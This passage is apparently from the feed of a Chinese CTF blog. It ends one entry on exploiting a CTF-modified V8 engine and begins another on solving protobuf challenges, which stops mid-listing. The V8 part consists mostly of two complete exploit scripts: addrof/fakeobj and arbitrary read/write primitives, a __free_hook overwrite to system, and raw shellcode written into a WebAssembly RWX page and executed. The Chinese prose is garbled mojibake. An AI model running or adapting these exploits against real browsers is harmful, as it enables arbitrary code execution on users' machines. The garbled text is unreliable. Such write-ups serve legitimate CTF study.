arbitrary_read(address_of(a.constructor) + <span class="number">0x30n</span> - <span class="number">1n</span>) - <span class="number">1n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;code_addr =&gt; 0x&#x27;</span> + code_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> v8_addr = arbitrary_read(code_addr + <span class="number">0x42n</span>);</span><br><span class="line"><span class="keyword">var</span> v8_base = v8_addr - <span class="number">0xfc8780n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;v8_base =&gt; 0x&#x27;</span> + v8_base.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> free_got_addr = v8_base + <span class="number">0x12aa8b8n</span>;</span><br><span class="line"><span class="keyword">var</span> free_addr = arbitrary_read(free_got_addr);</span><br><span class="line"><span class="keyword">var</span> libc_base = free_addr - <span class="number">0x9a6d0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;libc_base =&gt; 0x&#x27;</span> + v8_base.toString(<span class="number">16</span>).trim());</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> __free_hook = libc_base + <span class="number">0x1eee48n</span>;</span><br><span class="line"><span class="keyword">var</span> system_addr = libc_base + <span class="number">0x52290n</span>;</span><br><span class="line"></span><br><span class="line">arbitrary_write(__free_hook, system_addr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> cmd = <span class="string">&quot;gnome-calculator\x00&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">pwn()</span><br><span class="line"></span><br><span class="line">arbitrary_write(__free_hook, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230627183627029.png"                      alt="image-20230627183627029"                ></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> uint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;float64&#125; float_num</span></span><br><span class="line"><span class="comment">// @return &#123;uint64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">float_num</span>) </span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = float_num;</span><br><span class="line">    <span class="keyword">return</span> uint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;uint64&#125; uint64_num</span></span><br><span class="line"><span class="comment">// @return &#123;float64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">uint64_num</span>) </span>&#123;</span><br><span class="line">    uint64[<span class="number">0</span>] = uint64_num;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&quot;a&quot;</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> flt_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> flt_array_map = flt_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">address_of</span>(<span class="params">leak_obj</span>) </span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = leak_obj;</span><br><span class="line">    obj_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">var</span> res = obj_array[<span class="number">0</span>];</span><br><span class="line">    obj_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> f2i(res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_object</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    flt_array[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    flt_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">var</span> fake_obj = flt_array[<span class="number">0</span>];</span><br><span class="line">    flt_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arb_rw_arr = [flt_array_map, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;arb_rw_arr =&gt; 0x&quot;</span> + (address_of(arb_rw_arr) - <span class="number">0x20n</span>).toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> fake_obj = fake_object(address_of(arb_rw_arr) - <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_read</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(address - <span class="number">0x10n</span> + <span class="number">0x1n</span>)</span><br><span class="line">    <span class="keyword">return</span> f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sc_arr = [</span><br><span class="line">    <span class="number">0x10101010101b848n</span>, <span class="number">0x62792eb848500101n</span>, <span class="number">0x431480101626d60n</span>, <span class="number">0x2f7273752fb84824n</span>,</span><br><span class="line">    <span class="number">0x48e78948506e6962n</span>, <span class="number">0x1010101010101b8n</span>, <span class="number">0x6d606279b8485001n</span>, <span class="number">0x2404314801010162n</span>,</span><br><span class="line">    <span class="number">0x1485e086a56f631n</span>, <span class="number">0x313b68e6894856e6n</span>, <span class="number">0x101012434810101n</span>, <span class="number">0x4c50534944b84801n</span>,</span><br><span class="line">    <span class="number">0x6a52d231503d5941n</span>, <span class="number">0x894852e201485a08n</span>, <span class="number">0x50f583b6ae2n</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(sc_arr.length * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = address_of(buffer) - <span class="number">1n</span> + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_write</span>(<span class="params">address, value</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(buf_backing_store_addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">        data_view.setFloat64(i * <span class="number">8</span>, i2f(value[i]), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> pwn = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pwn_addr = address_of(pwn);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;pwn_addr =&gt; 0x&quot;</span> + pwn_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = arbitrary_read(pwn_addr - <span class="number">1n</span> + <span class="number">0x18n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;shared_info_addr =&gt; 0x&quot;</span> + shared_info_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> data_addr = arbitrary_read(shared_info_addr - <span class="number">1n</span> + <span class="number">0x8n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;data_addr =&gt; 0x&quot;</span> + data_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> instance_addr = arbitrary_read(data_addr - <span class="number">1n</span> + <span class="number">0x10n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;instance_addr =&gt; 0x&quot;</span> + instance_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> rwx_addr = arbitrary_read(instance_addr - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;rwx_addr =&gt; 0x&quot;</span> + rwx_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"></span><br><span class="line">arbitrary_write(rwx_addr, sc_arr);</span><br><span class="line"></span><br><span class="line">pwn();</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230627195354273.png"                      alt="image-20230627195354273"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¿™æ®µäº‹æƒ…å› ä¸ºå„ç§äº‹æƒ…è€½æï¼Œä¸€ç›´æ²¡æœ‰æ›´æ–°æ–‡ç« ã€‚æœ¬æ‰“ç®—æ–°çš„ä¸€ç¯‡å‡º&lt;code&gt;rootkit&lt;/code&gt;æ¥æ°´ä¸€ç¯‡ï¼Œåé¢å‘ç°a3ä½¬å†™çš„å¤ªå¤šäº†ï¼Œä¸æƒ³</summary>
      
    
    
    
    <category term="chrome-pwn" scheme="https://cv196082.gitee.io/categories/chrome-pwn/"/>
    
    
    <category term="overstep" scheme="https://cv196082.gitee.io/tags/overstep/"/>
    
  </entry>
  
  <entry>
    <title>å…³äºprotobufçš„è§£é¢˜æ­¥éª¤</title>
    <link href="https://cv196082.gitee.io/2023/05/30/protobuf/"/>
    <id>https://cv196082.gitee.io/2023/05/30/protobuf/</id>
    <published>2023-05-30T08:26:30.000Z</published>
    <updated>2023-05-30T08:28:07.409Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…¶å®åœ¨ä»¥å‰å·²ç»å¤šæ¬¡é‡è§è¿‡<code>protobuf</code>äº†ï¼Œä½†æ˜¯éƒ½ä¸å¤ªåœ¨æ„å› ä¸ºæ€»æ„Ÿè§‰ä¼šåƒmuslåº“ä¸€æ ·ï¼Œå­˜æ´»ä¸€æ®µæ—¶é—´åå°±æ¶ˆå¤±äº†ã€‚æ‰€ä»¥ä¹Ÿå¯¼è‡´æˆ‘ä¸€ç›´æ²¡æœ‰å»çœŸæ­£åšè¿‡è¿™æ ·çš„é¢˜ï¼Œè¿™æ¬¡å›½èµ›ç¬¬ä¸€å¤©æ°å¥½å‡ºç°äº†è¿™æ ·ä¸€é“é¢˜ï¼Œä¸å‡ºæ„å¤–æ²¡èƒ½è§£å‡ºæ¥ï¼Œå¦‚æœä¸çœ‹wpæˆ‘å¯èƒ½è¿˜ä¼šæ€€ç–‘è‡ªå·±çš„é€†å‘èƒ½åŠ›ï¼Œå› ä¸ºæˆ‘è ¢åˆ°çœ‹äº†å‡ ä¸ªå°æ—¶çš„1200å¤šè¡Œä»£ç ã€‚æœ€å¯æ¶çš„æ˜¯å½“åˆä¸æƒ³ç©webçš„ä¸€å¤§åŸå› å°±æ˜¯æˆ‘æ¯”è¾ƒç²—å¿ƒå¤§æ„ï¼Œé¢å¯¹ä¿¡æ¯æ”¶é›†æ—¶å¾€å¾€ä¼šå¿½ç•¥æ‰é‡è¦ä¿¡æ¯ï¼Œä½†æ˜¯ç°åœ¨çš„pwnä¹Ÿè¶Šæ¥è¶Šå¾€è¿™ä¸ªæ–¹å‘é äº†ã€‚ä¸å¯å¦è®¤çš„æ˜¯ï¼Œè¿™æå‡äº†é€‰æ‰‹çš„ç»¼åˆå®åŠ›(<del>æ¶å¿ƒé€‰æ‰‹</del>)ï¼Œåªæ˜¯æˆ‘ä¸å¤ªèƒ½æ¥å—ä»ä¸€ä¸ªå‘åˆè·³åˆ°äº†å¦å¤–ä¸€ä¸ªå‘é‡Œé¢å»äº†ã€‚ä¸è¿‡ï¼Œéœ€è¦è®¤æ¸…ç°å®çš„æ˜¯æˆ‘çš„é€†å‘æ°´å¹³ç¡®å®å¾ˆå·®ï¼Œæˆ‘ä¹Ÿå‡†å¤‡å¼€å§‹åˆ·é€†å‘é¢˜äº†ã€‚</p><h2 id="protobuf"><a href="#protobuf" class="headerlink" title="protobuf"></a>protobuf</h2><h3 id="ä»€ä¹ˆæ˜¯protobuf"><a href="#ä»€ä¹ˆæ˜¯protobuf" class="headerlink" title="ä»€ä¹ˆæ˜¯protobuf"></a>ä»€ä¹ˆæ˜¯protobuf</h3><p>Protocol Buffersï¼Œæ˜¯Googleå…¬å¸å¼€å‘çš„ä¸€ç§æ•°æ®æè¿°è¯­è¨€ï¼Œç±»ä¼¼äºXMLèƒ½å¤Ÿå°†ç»“æ„åŒ–æ•°æ®åºåˆ—åŒ–ï¼Œå¯ç”¨äºæ•°æ®å­˜å‚¨ã€é€šä¿¡åè®®ç­‰æ–¹é¢ã€‚å®ƒä¸ä¾èµ–äºè¯­è¨€å’Œå¹³å°å¹¶ä¸”å¯æ‰©å±•æ€§æå¼ºã€‚</p><p>åŒXMLç›¸æ¯”ï¼ŒProtocol buffersåœ¨åºåˆ—åŒ–ç»“æ„åŒ–æ•°æ®æ–¹é¢æœ‰è®¸å¤šä¼˜ç‚¹ï¼š</p><ol><li>  æ›´ç®€å•</li><li>  æ•°æ®æè¿°æ–‡ä»¶åªéœ€åŸæ¥çš„1/10è‡³1/3</li><li>  è§£æé€Ÿåº¦æ˜¯åŸæ¥çš„20å€è‡³100å€</li><li>  å‡å°‘äº†äºŒä¹‰æ€§</li><li>  ç”Ÿæˆäº†æ›´å®¹æ˜“åœ¨ç¼–ç¨‹ä¸­ä½¿ç”¨çš„æ•°æ®è®¿é—®</li><li>æ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€<br>   ï¼ˆè½¬è‡ªç™¾åº¦ç™¾ç§‘ï¼‰</li></ol><p>è¿™é‡Œå°±ä¸å¤šæäº†ï¼Œå®‰è£…çš„è¯è‡ªå·±æœä¸€ä¸‹å°±æœ‰çš„ã€‚</p><h3 id="ä½¿ç”¨protobuf"><a href="#ä½¿ç”¨protobuf" class="headerlink" title="ä½¿ç”¨protobuf"></a>ä½¿ç”¨protobuf</h3><p>é¦–å…ˆç¼–å†™ä¸€ä¸ªæµ‹è¯•æ–‡ä»¶<code>test.proto</code></p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">int64</span> aaa = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">uint64</span> bbb = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> ccc = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">bytes</span> ddd = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>protoc --c_out=. ./test.proto</code>å‘½ä»¤ç”Ÿæˆå¯¹åº”ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: test.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PROTOBUF_C_test_2eproto__INCLUDED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTOBUF_C_test_2eproto__INCLUDED</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;protobuf-c/protobuf-c.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PROTOBUF_C__BEGIN_DECLS</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> PROTOBUF_C_VERSION_NUMBER &lt; 1000000</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">error</span> This file was generated by a newer version of protoc-c which is incompatible with your libprotobuf-c headers. Please update your headers.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> 1003003 &lt; PROTOBUF_C_MIN_COMPILER_VERSION</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">error</span> This file was generated by an older version of protoc-c which is incompatible with your libprotobuf-c headers. Please regenerate this file with a newer version of protoc-c.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Test</span> <span class="title">Test</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- enums --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- messages --- */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>  _<span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ProtobufCMessage base;</span><br><span class="line">  <span class="keyword">int64_t</span> aaa;</span><br><span class="line">  <span class="keyword">uint64_t</span> bbb;</span><br><span class="line">  <span class="keyword">int64_t</span> ccc;</span><br><span class="line">  ProtobufCBinaryData ddd;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEST__INIT \</span></span><br><span class="line"><span class="meta"> &#123; PROTOBUF_C_MESSAGE_INIT (&amp;test__descriptor) \</span></span><br><span class="line"><span class="meta">    , 0, 0, 0, &#123;0,NULL&#125; &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Test methods */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__init</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test         *message)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__get_packed_size</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test   *message)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test   *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">uint8_t</span>             *out)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack_to_buffer</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test   *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCBuffer     *buffer)</span></span>;</span><br><span class="line"><span class="function">Test *</span></span><br><span class="line"><span class="function">       <span class="title">test__unpack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">size_t</span>               len,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">const</span> <span class="keyword">uint8_t</span>       *data)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__free_unpacked</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCAllocator *allocator)</span></span>;</span><br><span class="line"><span class="comment">/* --- per-message closures --- */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*Test_Closure)</span></span></span><br><span class="line"><span class="function">                 <span class="params">(<span class="keyword">const</span> Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="keyword">void</span> *closure_data)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- services --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- descriptors --- */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> ProtobufCMessageDescriptor test__descriptor;</span><br><span class="line"></span><br><span class="line">PROTOBUF_C__END_DECLS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* PROTOBUF_C_test_2eproto__INCLUDED */</span></span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯<code>test.pb-c.h</code>æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸­å®šä¹‰äº†è®¸å¤šçš„å‡½æ•°ï¼Œå¹¶ä¸”å®šä¹‰äº†ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span 